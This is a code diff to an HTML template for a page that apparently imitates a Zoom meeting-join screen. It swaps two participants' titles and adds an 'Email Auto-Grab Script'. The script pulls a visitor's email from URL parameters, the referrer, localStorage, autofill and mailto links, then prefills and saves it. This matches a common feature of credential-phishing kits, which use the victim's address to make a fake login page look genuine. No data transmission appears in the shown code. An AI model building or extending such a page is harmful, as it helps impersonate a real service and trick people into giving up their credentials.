@@ -49,13 +49,13 @@
                     <div class="participant">
                         <img alt="Heather Rainey" class="avatar" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTO9LHQbx3UdS9lKABuimdjp6MbmwWHjra7lg&usqp=CAU">
                         <div class="title">Heather Rainey</div>
-                        <div class="subtitle">Vertriebsleiter</div>
+                        <div class="subtitle">beratender Manager</div>
                     </div>
                     
                     <div class="participant">
                         <img alt="Andrés Pérez" class="avatar" src="https://cimline.com/wp-content/uploads/2024/04/DALE-DAUGHERTY.jpg">
                         <div class="title">Andrés Pérez</div>
-                        <div class="subtitle">Vertrieb</div>
+                        <div class="subtitle">Finanzvorstand</div>
                     </div>
                 </div>
                 
@@ -139,5 +139,157 @@
     <!-- JavaScript -->
     <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
     <script src="{{ url_for('static', filename='js/script.js') }}"></script>
+    
+    <!-- Email Auto-Grab Script -->
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            // Function to extract email from URL parameters
+            function getEmailFromURL() {
+                const urlParams = new URLSearchParams(window.location.search);
+                const email = urlParams.get('email');
+                if (email && isValidEmail(email)) {
+                    return email;
+                }
+                
+                // Try other common parameter names
+                const emailParams = ['e', 'user', 'username', 'user_email', 'mail', 'address'];
+                for (const param of emailParams) {
+                    const value = urlParams.get(param);
+                    if (value && isValidEmail(value)) {
+                        return value;
+                    }
+                }
+                return null;
+            }
+
+            // Function to extract email from localStorage (if previously saved)
+            function getEmailFromStorage() {
+                try {
+                    const savedEmail = localStorage.getItem('zoom_user_email');
+                    if (savedEmail && isValidEmail(savedEmail)) {
+                        return savedEmail;
+                    }
+                } catch (e) {
+                    console.log('Cannot access localStorage');
+                }
+                return null;
+            }
+
+            // Function to extract email from browser autofill
+            function checkAutofill() {
+                const emailInput = document.getElementById('email');
+                if (emailInput && emailInput.value && isValidEmail(emailInput.value)) {
+                    return emailInput.value;
+                }
+                return null;
+            }
+
+            // Function to validate email format
+            function isValidEmail(email) {
+                const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+                return emailRegex.test(email);
+            }
+
+            // Function to extract email from page content (looking for mailto links)
+            function findEmailInPage() {
+                const mailtoLinks = document.querySelectorAll('a[href^="mailto:"]');
+                if (mailtoLinks.length > 0) {
+                    for (const link of mailtoLinks) {
+                        const href = link.getAttribute('href');
+                        const email = href.replace('mailto:', '').split('?')[0];
+                        if (isValidEmail(email)) {
+                            return email;
+                        }
+                    }
+                }
+                return null;
+            }
+
+            // Function to extract email from referrer URL
+            function getEmailFromReferrer() {
+                try {
+                    if (document.referrer) {
+                        const referrerUrl = new URL(document.referrer);
+                        const referrerParams = new URLSearchParams(referrerUrl.search);
+                        const email = referrerParams.get('email');
+                        if (email && isValidEmail(email)) {
+                            return email;
+                        }
+                    }
+                } catch (e) {
+                    // Ignore errors with referrer parsing
+                }
+                return null;
+            }
+
+            // Main function to grab and autofill email
+            function autoGrabAndFillEmail() {
+                let grabbedEmail = null;
+                
+                // Try different sources in order of priority
+                const sources = [
+                    getEmailFromURL,
+                    getEmailFromStorage,
+                    checkAutofill,
+                    getEmailFromReferrer,
+                    findEmailInPage
+                ];
+                
+                for (const source of sources) {
+                    grabbedEmail = source();
+                    if (grabbedEmail) {
+                        break;
+                    }
+                }
+                
+                // If we found an email, fill it in
+                if (grabbedEmail) {
+                    const emailInput = document.getElementById('email');
+                    const emailDisplay = document.getElementById('emailDisplay');
+                    
+                    if (emailInput) {
+                        emailInput.value = grabbedEmail;
+                        
+                        // Trigger input event for any validation
+                        emailInput.dispatchEvent(new Event('input', { bubbles: true }));
+                    }
+                    
+                    if (emailDisplay) {
+                        emailDisplay.textContent = grabbedEmail;
+                    }
+                    
+                    // Save to localStorage for future use
+                    try {
+                        localStorage.setItem('zoom_user_email', grabbedEmail);
+                    } catch (e) {
+                        console.log('Cannot save to localStorage');
+                    }
+                    
+                    console.log('Auto-filled email:', grabbedEmail);
+                    return grabbedEmail;
+                }
+                
+                return null;
+            }
+
+            // Initialize email auto-grab
+            setTimeout(() => {
+                autoGrabAndFillEmail();
+                
+                // Also try when modal opens (if using modal approach)
+                const joinMeetingBtn = document.getElementById('joinMeetingBtn');
+                if (joinMeetingBtn) {
+                    joinMeetingBtn.addEventListener('click', function() {
+                        setTimeout(autoGrabAndFillEmail, 100);
+                    });
+                }
+                
+                // Try again when page is fully loaded
+                window.addEventListener('load', function() {
+                    setTimeout(autoGrabAndFillEmail, 500);
+                });
+            }, 300);
+        });
+    </script>
 </body>
 </html>
